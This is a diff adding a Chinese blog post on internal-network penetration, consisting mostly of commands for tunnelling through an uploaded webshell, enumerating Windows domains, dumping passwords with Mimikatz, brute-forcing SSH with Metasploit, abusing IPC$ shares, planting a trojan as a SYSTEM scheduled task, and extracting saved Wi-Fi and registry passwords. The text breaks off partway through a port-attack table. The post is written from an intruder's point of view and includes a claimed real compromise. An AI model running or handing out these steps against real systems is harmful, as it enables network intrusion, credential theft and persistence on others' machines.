@@ -141,6 +141,433 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-intranet_ploit" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/08/10/intranet_ploit/">内网渗透 基础 + 工具</a>
+    </h1>
+  
+
+        
+        <a href="/2018/08/10/intranet_ploit/" class="archive-article-date">
+  	<time datetime="2018-08-10T07:33:42.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-10</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <pre><code>目录
+
+1.代理
+
+2.内网命令
+
+3.抓密码
+
+4.ipc$共享目录利用
+
+5.端口漏洞
+
+6.溢出
+</code></pre><p>#<br>    1.代理</p>
+<pre><code>端口转发工具有很多比如：rebind2 &amp;nbsp;eDuh &amp;nbsp;ssock&amp;nbsp; reDuh&amp;nbsp; lcx &amp;nbsp;socks5 等……..
+
+下面介绍我比较喜欢的2款工具LCX+ socks5
+
+1.lcx
+
+路由器加端口 TCP协议 ，固定IP地址本机
+
+![](http://hongkediguo.mebug.cn/content/uploadfile/201704/0c29d04e65a3589cf456d818d46a34aa20170421081636.png)
+
+![](http://hongkediguo.mebug.cn/content/uploadfile/201704/6c2d095378e8bda394ab1c61277a3ab020170421081643.png)
+
+大马设置
+
+Local Ip : 转发ip
+
+Local Port : 转发端口
+
+Remote Ip :本机ip （ip138.com外网ip）
+
+Remote Port : 路由器上面设置的端口
+
+![](http://hongkediguo.mebug.cn/content/uploadfile/201704/b616dee8742e1fd8d67b87adc910e6e420170421081652.png)
+
+Lcx上面执行：
+
+lcx.exe&amp;nbsp; -listen 3839 38390
+
+&amp;nbsp;
+
+2.reGeorg + proxifier
+
+SOCKS:下载地址:&amp;nbsp;[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)
+
+配置文件
+
+Vim /etc/proxychains.conf
+
+![](http://hongkediguo.mebug.cn/content/uploadfile/201704/897f9873111022e371d00037b9cf08d420170421081700.png)
+
+添加socks5 127.0.0.1 8090 （&lt;span style=&quot;box-sizing:border-box;color:#FF0000;&quot;&gt;端口和监听端口要一样&lt;/span&gt;）
+
+![](http://hongkediguo.mebug.cn/content/uploadfile/201704/4ab6c501a3468f2e2998c55d9e91d0f020170421081706.png)
+
+使用方法：
+
+python reGeorgSocksProxy.py -u&amp;nbsp;[http://xxx.com/sk5.php -p 8090](http://xxx.com/sk5.php%20-p%208090)
+
+上传一个脚本（asp,php,jsp,ashx）到webshell上
+
+这些reGeorgSocksProxy.py脚本，监听shell端口
+
+Win下面使用proxifier连接
+
+![](http://hongkediguo.mebug.cn/content/uploadfile/201704/2e4073e6203432e5f0198a5e571bcb4120170421081711.png)
+
+配置文件-代理服务
+
+Ip地址设置kali本机ip
+</code></pre><p>#<br>    2.内网常用的命令</p>
+<pre><code>ipconfig /all
+
+查询ip判断有没有域服务，ps:大型网络一般都有dns服务器域。
+
+![](http://hongkediguo.mebug.cn/content/uploadfile/201704/6bf694c6633763e80268afcb4051738b20170421081717.png)
+
+net view /domain，我们可以知道有1个域。
+
+![](http://hongkediguo.mebug.cn/content/uploadfile/201704/b59e3a406ef16aabfcbe2f6fe305eec020170421081722.jpg)
+
+Net view
+
+查看机器注释或许能得到当前活动状态的机器列表，如果禁用netbios就查看不出来
+
+![](http://hongkediguo.mebug.cn/content/uploadfile/201704/fef0ce504b8abbed583ffa0eeef6f83520170421081728.jpg)
+
+&lt;span style=&quot;box-sizing:border-box;color:#FF0000;&quot;&gt;可以参考以下是经用的内网[渗透](http://www.52bug.cn/sort/Security&amp;#10;)命令：&lt;/span&gt;
+</code></pre><pre style="box-sizing: border-box; overflow: auto; font-family: Consolas, &quot;Liberation Mono&quot;, Courier, monospace; font-size: 13px; padding: 6px 10px; margin-top: 15px; margin-bottom: 15px; line-height: 19px; color: rgb(51, 51, 51); word-break: break-all; word-wrap: break-word; border: 1px solid rgb(204, 204, 204); border-radius: 3px; background-color: rgb(248, 248, 248); position: relative;">`net group /domain                        //获得所有域用户组列表 
+net group qq_group /domain               //显示域中qq_group组的成员 
+net group qq_group /del /domain          //删除域中qq_group组
+net group qq_group qq /del /domain       //删除域内qq_group 群组中的成员QQ
+net group qq_group /add /domain          //增加域中的群组
+net group "domain admins"  /domain       //获得域管理员列表
+net group "enterprise admins" /domain    //获得企业管理员列表
+net localgroup administrators /domain    //获取域内置administrators组用（enterprise admins、domain admins）
+net group "domain controllers"  /domain   //获得域控制器列表
+net group "domain computers"  /domain    //获得所有域成员计算机列表
+net user /domain                        //获得所有域用户列表
+net user someuser /domain              //获得指定账户someuser的详细信息
+net accounts /domain                //获得域密码策略设置，密码长短，错误锁定等信息
+nei view /domain                   //查询有几个域, 查询域列表
+net view /domain:testdomain       //查看 testdomain域中的计算机列表
+nltest /domain_trusts              //获取域信任信息
+net user domain-admin /domain      //查看管理员登陆时间，密码过期时间，是否有登陆脚本，组分配等信息
+net config Workstation         //查询机器属于哪个域
+net time /domian               //查询主域服务器的时间
+echo %logonserver%              //查看登陆到这台服务器的计算机名
+net time  \\192.168.1.1         //查询远程共享主机192.168.1.1的时间
+net use \\IP\ipc$ password /user:username@domain     //ipc$域内连接
+net  view  \\dc2.backlion.com         //查看域控共享情况
+dir \\dc2.backlion.com\SYSVOL /s /a &gt; sysvol.txt  //列出sysvol日志记录
+xcopy \\dc2.backlion.com\sysvol.txt  sysvol.txt  /i  /e  /c //远程拷贝到本地sysvol日志
+net user  /domain  bk  bk123                 //修改域内用户密码，需要管理员权限
+net  localgroup  administartors   SEZKL\backlion  /add      //将SEZKL域中的用户backlion添加到administrators组中
+mstsc /admin                 //远程桌面登录到console会话解决hash无法抓出问题
+gpupdate/force                  //更新域策略
+psexec  \\192.168.1.3  -u  administrator  -p  bk1234  -c  gsecdump.exe  -u
+  //从域服务器密码存储文件windows/ntds/ntds.dit导出hash值出来
+gsecdump  -a        //获取域登管理员登录过得hash值，这里gescdump为第三方导出AD域的hash值
+tasklist /S ip /U domain\username /P /V     //查看远程计算机进程列 `<span class="copy_code"></span><div class="zclip" id="zclip-ZeroClipboardMovie_1" style="position: absolute; right: 0px; top: 0px; width: 46px; height: 29px; z-index: 99;"><embed id="ZeroClipboardMovie_1" src="http://www.52bug.cn/content/plugins/lanye_zclip/ZeroClipboard.swf" loop="false" menu="false" quality="best" bgcolor="#ffffff" width="46" height="29" name="ZeroClipboardMovie_1" align="middle" allowscriptaccess="always" allowfullscreen="false" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer" flashvars="id=1&amp;width=46&amp;height=29" wmode="transparent"></div></pre>
+
+<p>###<br>    基本内网渗透命令：</p>
+<pre style="box-sizing: border-box; overflow: auto; font-family: Consolas, &quot;Liberation Mono&quot;, Courier, monospace; font-size: 13px; padding: 6px 10px; margin-top: 15px; margin-bottom: 15px; line-height: 19px; color: rgb(51, 51, 51); word-break: break-all; word-wrap: break-word; border: 1px solid rgb(204, 204, 204); border-radius: 3px; background-color: rgb(248, 248, 248); position: relative;">`ipconfig/all    //查看IP地址
+ipconfig /release  //释放地址
+ipconfig /renew 重新获取Ip地址
+whoami    //查询账号所属权限
+whoami/all  //查看sid值
+systeminfo  //查询系统以及补丁信息
+tasklist /svc   //查看进程
+taskkill /im 进程名称(cmd)  //结束进程
+taskkill /pid[进程码] -t(结束该进程) -f(强制结束该进程以及所有子进程)
+wmic qfe  get hotfixid    //查看已安装过得补丁，这个很实用
+wmic qfe list full /format:htable &gt; hotfixes.htm  //详细的补丁安装
+wmic  qfe      //查询补丁信息以及微软提供的下载地址
+ping hostname(主机名）   //显示该机器名的IP 
+net start   //查看当前运行的服务
+net user      //查看本地组的用户
+net localhroup administrators   //查看本机管理员组有哪些用户
+net use      //查看会话
+net session     //查看当前会话
+net share       //查看SMB指向的路径[即共享]
+wmic share get name,path   //查看SMB指向的路径
+wmic nteventlog get path,filename,writeable //查询系统日志文件存储位置
+net use \\IP\ipc$  password  /user:username      //建立IPC会话（工作组模式）
+net use  z:  \\192.168.1.1      //建立映射到本机Z盘
+net time \\172.16.16.2        //查询共享主机的是
+at \\172.16.16.2 13:50 c:\windows\2009.exe      //在共享主机上执行
+netstat  -ano      //查看开放的端口
+netstat -an | find “3389”   //找到3389端口
+net accounts      //查看本地密码策略
+nbtstat –A ip      //netbiso查询
+net view      //查看机器注释或许能得到当前活动状态的机器列表，如果禁用netbios就查看不出来
+echo %PROCESSOR_ARCHITECTURE%         //查看系统是32还是64位  
+set                              //查看系统环境设置变量
+net start                     //查看当前运行的服务
+wmic service list brief              //查看进程服务
+wmic process list brief         //查看进程
+wmic startup list brief       //查看启动程序信息
+wmic product list brief            //查看安装程序和版本信息（漏洞利用线索）
+wmic startup list full         //识别开机启动的程序
+wmic process where(description="mysqld.exe") &gt;&gt; mysql.log  //获取软件安装路径
+
+for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear
+ //一键获取wifi密码
+
+ if defined PSModulePath (echo 支持powershell) else (echo 不支持powershell) 
+//查看是否支持posershell
+
+qwinsta                       //查看登录情况
+
+schtasks.exe  /Create /RU "SYSTEM" /SC MINUTE /MO 45 /TN FIREWALL /TR "c:/muma.ex    e" /ED 2017/4/7  //添加计划任务
+
+set KB2829361=MS13-046&amp;set KB2830290=MS13-046&amp;set KB2667440=MS12-020&amp;set KB2667402=MS12-020&amp;set KB3124280=MS16-016&amp;set KB3077657=MS15-077&amp;set KB3045171=MS15-051&amp;set KB2592799=MS11-080&amp;set KB952004=MS09-012 PR&amp;set KB956572=MS09-012 巴西烤肉&amp;set KB970483=MS09-020 iis6&amp;set KB2124261=MS10-065 ii7&amp;set KB2271195=MS10-065 ii7&amp;systeminfo&gt;a.txt&amp;(for %i in (KB952004 KB956572 KB2393802 KB2503665 KB2592799 KB2621440 KB2160329 KB970483 KB2124261 KB977165 KB958644 KB2667402 KB2667440 KB2830290 KB2829361 KB3045171 KB3077657 KB3124280) do @type a.txt|@find /i "%i"||@echo %%i% Not Installed!)&amp;del /f /q /a a.txt
+ //windows未打补丁情况
+
+ REG query HKCU  /v "pwd" /s  //获取保存到注册表中的密码 `<span class="copy_code"></span><div class="zclip" id="zclip-ZeroClipboardMovie_2" style="position: absolute; right: 0px; top: 0px; width: 46px; height: 29px; z-index: 99;"><embed id="ZeroClipboardMovie_2" src="http://www.52bug.cn/content/plugins/lanye_zclip/ZeroClipboard.swf" loop="false" menu="false" quality="best" bgcolor="#ffffff" width="46" height="29" name="ZeroClipboardMovie_2" align="middle" allowscriptaccess="always" allowfullscreen="false" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer" flashvars="id=2&amp;width=46&amp;height=29" wmode="transparent"></div></pre>
+
+<p>###<br>    内网网络结构用的命令：</p>
+<pre style="box-sizing: border-box; overflow: auto; font-family: Consolas, &quot;Liberation Mono&quot;, Courier, monospace; font-size: 13px; padding: 6px 10px; margin-top: 15px; margin-bottom: 15px; line-height: 19px; color: rgb(51, 51, 51); word-break: break-all; word-wrap: break-word; border: 1px solid rgb(204, 204, 204); border-radius: 3px; background-color: rgb(248, 248, 248); position: relative;">`tracert IP    //路由跟踪
+route print    //打印路由表
+arp -a          //列出本网段内所有活跃的IP地址
+arp -s （ip + mac）//绑定mac与ip地址
+arp -d （ip + mac） //解绑mac与ip地址
+nbtscan -r 192.168.16.0/24      //通过小工具nbtscan扫描整个网络
+netsh firewall show config     //查看防火墙策略
+netsh firewall show state     //查看防火墙策略
+for /l %i in (1,1,255) do @ping 10.0.0.%i -w 1 -n 1 | find /i "ttl"   //批量扫描内网存活主机
+
+windows自带端口转发：
+netsh interface ipv6 install  //首先安装IPV6（xp、2003下IPV6必须安装，否则端口转发不可用！）
+netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=22 connectaddress=1.1.1.1 connectport=22  //将本机22到1.1.1.1的22
+netsh interface portproxy add v4tov4 listenaddress=192.168.193.1 listenport=22 connectaddress=8.8.8.8 connectport=22
+netsh interface portproxy add v4tov4 listenaddress=192.168.193.1 listenport=22 connectaddress=www.baidu.com connectport=22
+netsh interface portproxy show all // 查看转发配置
+netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=22 //删除配置
+netsh firewall set portopening protocol=tcp port=22 name=Forward mode=enable scope=all profile=all  //添加防火墙规则，允许连接22： `<span class="copy_code"></span><div class="zclip" id="zclip-ZeroClipboardMovie_3" style="position: absolute; right: 0px; top: 0px; width: 46px; height: 29px; z-index: 99;"><embed id="ZeroClipboardMovie_3" src="http://www.52bug.cn/content/plugins/lanye_zclip/ZeroClipboard.swf" loop="false" menu="false" quality="best" bgcolor="#ffffff" width="46" height="29" name="ZeroClipboardMovie_3" align="middle" allowscriptaccess="always" allowfullscreen="false" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer" flashvars="id=3&amp;width=46&amp;height=29" wmode="transparent"></div></pre>
+
+<p>###<br>    敏感数据和目录：</p>
+<pre style="box-sizing: border-box; overflow: auto; font-family: Consolas, &quot;Liberation Mono&quot;, Courier, monospace; font-size: 13px; padding: 6px 10px; margin-top: 15px; margin-bottom: 15px; line-height: 19px; color: rgb(51, 51, 51); word-break: break-all; word-wrap: break-word; border: 1px solid rgb(204, 204, 204); border-radius: 3px; background-color: rgb(248, 248, 248); position: relative;">`dir /b/s config.*              //查看所在目录所有config.为前缀的文件
+findstr /si password *.xml *.ini *.txt     //查看后缀名文件中含有password关键字的文件
+findstr /si login *.xml *.ini *.txt     //查看后缀名文件中含有login关键字的文件
+copy con 创建命令：
+copy con  ftp.bat     //创建ftp.bat批处理，然后输入ifconfig等命令，按ctr+z退出，并创建成功
+copy con  test.vbs    //创建test.vbs脚本，输入脚本后，按ctr+z退出，并创建成功 `<span class="copy_code"></span><div class="zclip" id="zclip-ZeroClipboardMovie_4" style="position: absolute; right: 0px; top: 0px; width: 46px; height: 29px; z-index: 99;"><embed id="ZeroClipboardMovie_4" src="http://www.52bug.cn/content/plugins/lanye_zclip/ZeroClipboard.swf" loop="false" menu="false" quality="best" bgcolor="#ffffff" width="46" height="29" name="ZeroClipboardMovie_4" align="middle" allowscriptaccess="always" allowfullscreen="false" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer" flashvars="id=4&amp;width=46&amp;height=29" wmode="transparent"></div></pre>
+
+<p>###<br>    dsquery的AD查询工具：</p>
+<pre style="box-sizing: border-box; overflow: auto; font-family: Consolas, &quot;Liberation Mono&quot;, Courier, monospace; font-size: 13px; padding: 6px 10px; margin-top: 15px; margin-bottom: 15px; line-height: 19px; color: rgb(51, 51, 51); word-break: break-all; word-wrap: break-word; border: 1px solid rgb(204, 204, 204); border-radius: 3px; background-color: rgb(248, 248, 248); position: relative;">`dsquery user domainroot -limit 65535 &amp;&amp; net user /domain    //列出该域内所有用户名
+dsquery server -domain super.com | dsget server -dnsname -site    //搜索域内所有域控制器并显示他们的DNS主机名和站点名称
+dsquery contact    //寻找目录中的联系人
+dsquery subnet     //列出该域内网段划分
+query user             //查询那些用户在线
+dsquery group &amp;&amp; net group /domain     //列出该域内分组
+dsquery ou                              //列出该域内组织单位
+dsquery server &amp;&amp; net time /domain      //列出该域内域控制器
+dsquery site -o rdn                  //搜索域中所有站点的名称
+dsquery group dc=super,dc=com |more    //搜索在DC=SUPER,DC=COM 域中的所有组
+psloggedon.exe                        //查询那台主机和用户登录到该主机上
+netsess.exe   //192.168.1.115         //远程主机上无需管理员权限,查询到主机名和用户
+reg query "HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\TERMINAL SERVER CLIENT\DEFAULT" //获取最近mstsc登录的记录 `<span class="copy_code"></span><div class="zclip" id="zclip-ZeroClipboardMovie_5" style="position: absolute; right: 0px; top: 0px; width: 46px; height: 29px; z-index: 99;"><embed id="ZeroClipboardMovie_5" src="http://www.52bug.cn/content/plugins/lanye_zclip/ZeroClipboard.swf" loop="false" menu="false" quality="best" bgcolor="#ffffff" width="46" height="29" name="ZeroClipboardMovie_5" align="middle" allowscriptaccess="always" allowfullscreen="false" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer" flashvars="id=5&amp;width=46&amp;height=29" wmode="transparent"></div></pre>
+
+<p>###<br>    DOS常用快捷命令</p>
+<pre style="box-sizing: border-box; overflow: auto; font-family: Consolas, &quot;Liberation Mono&quot;, Courier, monospace; font-size: 13px; padding: 6px 10px; margin-top: 15px; line-height: 19px; color: rgb(51, 51, 51); word-break: break-all; word-wrap: break-word; border: 1px solid rgb(204, 204, 204); border-radius: 3px; background-color: rgb(248, 248, 248); margin-bottom: 0px !important; position: relative;">`mspaint　　画图工具
+calc　　计算机
+notepad　　记事本
+taskmgr　　任务管理器
+osk　　打开屏幕键盘
+gpedit.msc　　组策略
+services.msc　　本地服务
+compmgmt.msc　　计算机管理
+devmgmt.msc　　设备管理器
+winver　　查看系统版本
+magnify　　放大镜实用程序
+eventvwr　　事件查看器
+Regedit　　打开注册表
+resmon　　资源监视器
+WMIC BIOS get releasedate　　查看电脑生产日期
+mstsc -f　　远程连接（可以全屏）`<span class="copy_code"></span><div class="zclip" id="zclip-ZeroClipboardMovie_6" style="position: absolute; right: 0px; top: 0px; width: 46px; height: 29px; z-index: 99;"><embed id="ZeroClipboardMovie_6" src="http://www.52bug.cn/content/plugins/lanye_zclip/ZeroClipboard.swf" loop="false" menu="false" quality="best" bgcolor="#ffffff" width="46" height="29" name="ZeroClipboardMovie_6" align="middle" allowscriptaccess="always" allowfullscreen="false" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer" flashvars="id=6&amp;width=46&amp;height=29" wmode="transparent"></div></pre>
+
+<p># </p>
+<pre><code>3. 抓密码
+
+Mimikatz
+
+下载地址：https://github.com/gentilkiwi/mimikatz
+
+![](http://hongkediguo.mebug.cn/content/uploadfile/201704/b7a28987893242d8a56992995ec790d420170421081739.jpg)
+
+第一条：privilege::debug&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; //提升权限
+
+第二条：sekurlsa::logonpasswords&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; //抓取密码
+
+记录 Mimikatz输出：
+
+第一条：””privilege::debug”” “”log sekurlsa::logonpasswords full”” exit &amp;amp;&amp;amp; dir
+
+将输出导入到本地文件：
+
+第二条：””privilege::debug”” “”sekurlsa::logonpasswords full”” exit &amp;gt;&amp;gt; log.txt
+
+SAMInside
+
+这款工具有利有弊：
+</code></pre><ol>
+<li>有时候抓不出密码，安全环境。（弊）</li>
+<li><p>抓出的密码有时候<a href="http://www.52bug.cn/sort/cracktool" target="_blank" rel="noopener">破解</a>网站破解不出SAMInside工具是跑密码表,一般都可以破解。</p>
+<p><img src="http://hongkediguo.mebug.cn/content/uploadfile/201704/c82331e1d2fef8ededc73ac3f6b79e3420170421081744.jpg" alt=""></p>
+<p>抓出来的密码可以使用爆破工具扫描。。。。。PS(首先要知道里面有流量监控，防火墙？)</p>
+<p>推荐使用：</p>
+<p><img src="http://hongkediguo.mebug.cn/content/uploadfile/201704/9939a0ae4a2acca8ac9e1c82a7a01ca720170421081750.png" alt=""></p>
+<p>Linux &nbsp;metasploit</p>
+<p>use auxiliary/scanner/ssh/ssh_login 选择ssh口令猜解模块</p>
+<p>set RHOSTS 192.168.1.105&nbsp; 扫描的ip地址</p>
+<p>set USERNAME root &nbsp;扫描的用户名为root</p>
+<p>set PASS_FILE/root/password.txt&nbsp;&nbsp; 设置字典</p>
+<p>set THREADS 20&nbsp;&nbsp; 设置线程根据实际情况设置</p>
+<p>show options&nbsp;&nbsp;&nbsp;&nbsp;查看设置信息</p>
+<p>run&nbsp;&nbsp;&nbsp; 开始扫描</p>
+<p><img src="http://hongkediguo.mebug.cn/content/uploadfile/201704/568e7a22c8f6a6330c02da29672fd92f20170421081755.png" alt=""></p>
+<p>win推荐使用ntscan扫描速度非常快</p>
+<p><img src="http://hongkediguo.mebug.cn/content/uploadfile/201704/dd3c25678b4c34dec4ef17dbb664bdaa20170421081800.jpg" alt=""></p>
+</li>
+</ol>
+<p>#<br>    4.ipc$共享目录</p>
+<pre><code>使用命令 net use url=file://\\IP\ipc$\\IP\ipc$ “” /user:”” 就可以简单地和目标建立一个空连接（需要目标开放ipc$）。（来源百度）
+
+利用工具 流光，DTools 的IPC$探测功能，可进行扫描（ps:建议摸清楚内网有没有监控）
+
+或者使用 \\可以查询管理员链接过那一台服务器
+
+\\192.168.0.77
+
+\\192.168.0.77\c$ （进入c盘）
+
+![](http://hongkediguo.mebug.cn/content/uploadfile/201704/a4320c615919ebeed5f7afb72dece88220170421081805.png)
+
+或者网络处查看
+
+![](http://hongkediguo.mebug.cn/content/uploadfile/201704/e370b81c2a94bb502150155f8d779c7c20170421081816.png)
+
+Ps:（真实案例）
+
+我通过tomcat拿到了一台服务器，但是那一台服务器密码不通杀，我什么扫描192.168.x.x所有网站，只扫描出几个都是一些路由器，tomcat（没有弱口令），我通过tomcat的一台共享ipc$拿下的服务器。
+</code></pre><p>#<br>    5.端口漏洞</p>
+<table class="table" style="box-sizing:border-box;border-spacing:0px;font-size:14px;width:740px;max-width:100%;margin-bottom:20px;border-top-style:solid;border-top-width:1px;border-top-color:#DDDDDD;border-left-style:solid;border-left-width:1px;border-left-color:#DDDDDD;color:#333333;font-family:'Helvetica Neue', Helvetica, Arial, 'Lucida Grande', 'Hiragino Sans GB', 微软雅黑, 'WenQuanYi Micro Hei', STHeiti, SimSun, sans-serif;line-height:24px;background-color:#FFFFFF;"><br>    <thead style="box-sizing:border-box;"><br>        <tr style="box-sizing:border-box;"><br>            <th style="box-sizing:border-box;padding:8px;text-align:center;border-bottom-style:solid;border-bottom-width:2px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:bottom;border-top-width:0px;background-color:#F9F9F9;"><br>                端口号<br>            </th><br>            <th style="box-sizing:border-box;padding:8px;text-align:center;border-bottom-style:solid;border-bottom-width:2px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:bottom;border-top-width:0px;background-color:#F9F9F9;"><br>                端口说明<br>            </th><br>            <th style="box-sizing:border-box;padding:8px;text-align:center;border-bottom-style:solid;border-bottom-width:2px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:bottom;border-top-width:0px;background-color:#F9F9F9;"><br>                攻击技巧<br>            </th><br>        </tr><br>    </thead><br>    <tbody style="box-sizing:border-box;"><br>        <tr style="box-sizing:border-box;"><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                21/22/69<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                ftp/tftp：文件传输协议<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                爆破\嗅探\溢出\后门<br>            </td><br>        </tr><br>        <tr style="box-sizing:border-box;"><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                22<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                ssh：远程连接<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                爆破OpenSSH；28个退格<br>            </td><br>        </tr><br>        <tr style="box-sizing:border-box;"><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                23<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                telnet：远程连接<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                爆破\嗅探<br>            </td><br>        </tr><br>        <tr style="box-sizing:border-box;"><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                25<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                smtp：邮件服务<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                邮件伪造<br>            </td><br>        </tr><br>        <tr style="box-sizing:border-box;"><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                53<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                DNS：域名系统<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                DNS区域传输\DNS劫持\DNS缓存投毒\DNS欺骗\利用DNS隧道技术刺透防火墙<br>            </td><br>        </tr><br>        <tr style="box-sizing:border-box;"><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                67/68<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                dhcp<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                劫持\欺骗<br>            </td><br>        </tr><br>        <tr style="box-sizing:border-box;"><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                110<br>            </td><br>            <td style="box-sizing:border-box;padding:8px;border-bottom-style:solid;border-bottom-width:1px;border-bottom-color:#DDDDDD;border-right-style:solid;border-right-width:1px;border-right-color:#DDDDDD;line-height:1.42857;vertical-align:top;border-top-width:1px;border-top-style:solid;border-top-color:#DDDDDD;"><br>                pop3<br>            </td><br>            